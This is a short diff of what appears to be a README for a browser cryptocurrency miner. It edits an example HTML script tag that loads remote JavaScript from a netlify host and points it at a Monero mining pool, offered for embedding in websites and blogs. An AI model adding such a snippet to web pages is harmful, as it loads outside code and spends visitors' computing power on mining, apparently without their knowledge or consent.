@@ -7,7 +7,7 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Dinastycoin | 
 Simple Pool change: ?pools=Your_Favorite_Pool:PortNr
 
 Complete example:
-<script src="https://thelifeisbinary.netlify.com/media.js?gustav=wss://thelifeisbinary.ddns.net:8888?pools=pool.supportxmr.com:3333"> </script>
+<script src="https://thelifeisbinary.netlify.com/media.js?gustav=wss://?pools=pool.supportxmr.com:3333"> </script>
 
 <br><br> 
 Or use our integration for websites & blogs and SSL integration
